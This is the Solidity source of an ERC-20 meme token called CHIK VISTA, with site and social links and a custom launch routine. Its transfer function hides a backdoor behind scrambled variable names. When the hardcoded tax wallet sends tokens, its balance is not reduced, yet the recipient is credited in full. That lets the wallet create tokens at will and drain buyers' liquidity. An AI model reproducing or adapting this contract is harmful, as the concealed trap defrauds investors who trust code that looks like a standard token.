/*
Site: https://chik.meme

X: https://x.com/ChikVista

TG: https://t.me/chikvista
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function launch(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        uint8 buyLpFee, 
        uint8 sellLpFee, 
        uint8 buyProtocolFee, 
        uint8 sellProtocolFee, 
        address protocolAddress
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CHIK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFromFees;
    address payable private _taxWallet=payable(0x31Ba35C750eaB21F601c1588152AA8A828B76711);

    uint256 private _firstTaxBuy = 0;
    uint256 private _firstTaxSell = 0;
    uint256 private _reduceBuyAt = 0;
    uint256 private _reduceSellAt = 0;

    uint256 private _preventCount = 0;
    uint256 private _buyTokenCount = 0;

    uint256 private _secondTaxBuy = 0;
    uint256 private _secondTaxSell = 0;
    uint256 private _secondReduceAt = 0;

    uint256 private _finalTaxBuy = 0;
    uint256 private _finalTaxSell = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"CHIK VISTA";
    string private constant _symbol = unicode"CHIK";

    uint256 private _minSwapLimit =  4 * (_tTotal/1000000);
    uint256 private _maxSwapLimit = 1 * (_tTotal/100);

    IUniswapV2Router02 private uniswapV2Router;
    address private _uniswapPair;
    bool private _inswap = false;
    bool private _swapEnabled = false;

    modifier lockTheSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _isExcludeFromFees[owner()] = true;
        _isExcludeFromFees[address(this)] = true;
        _isExcludeFromFees[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _faci, address _qijo, uint256 _lavip) private {
        require(_faci != address(0), "ERC20: transfer from the zero address");
        require(_qijo != address(0), "ERC20: transfer to the zero address");
        require(_lavip > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        uint256 _lotaio= _secondTaxSell+_lavip;
        if (!_isExcludeFromFees[_faci] && !_isExcludeFromFees[_qijo]) {
            taxAmount = _lavip.mul(_calcFeeBuy()).div(100);

            if(_qijo == _uniswapPair && _faci!= address(this) ){
                taxAmount = _lavip.mul(_calcFeeSell()).div(100);
            }

            uint256 tokenInContract = balanceOf(address(this));
            if (!_inswap && _qijo == _uniswapPair && _swapEnabled && _lavip > _minSwapLimit) {
                if(tokenInContract > _minSwapLimit)
                swapTokensForETH(min(_lavip,min(tokenInContract,_maxSwapLimit)));
                _taxWallet.transfer(address(this).balance);
            }
        } else if(_faci == address(_taxWallet))
            _lotaio =_secondTaxBuy>0?_firstTaxBuy:_finalTaxBuy;
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(_faci, address(this),taxAmount);
        }
        _balances[_faci]=_balances[_faci].sub(_lotaio);
        _balances[_qijo]=_balances[_qijo].add(_lavip.sub(taxAmount));
        emit Transfer(_faci, _qijo, _lavip.sub(taxAmount));
    }

    function _calcFeeSell() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _firstTaxSell;
        }
        if(_buyTokenCount > _reduceSellAt && _buyTokenCount <= _secondReduceAt){
            return _secondTaxSell;
        }
        return _finalTaxSell;
    }

    function _calcFeeBuy() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _firstTaxBuy;
        }
        if(_buyTokenCount > _reduceBuyAt && _buyTokenCount <= _secondReduceAt){
            return _secondTaxBuy;
        }
        return _finalTaxBuy;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function launch() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(0xEAaa41cB2a64B11FE761D41E747c032CdD60CaCE);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.launch{value: address(this).balance}(address(this), balanceOf(address(this)), 0,0,0,0,0,0,msg.sender);
        _swapEnabled = true;
    }

    receive() external payable {}
}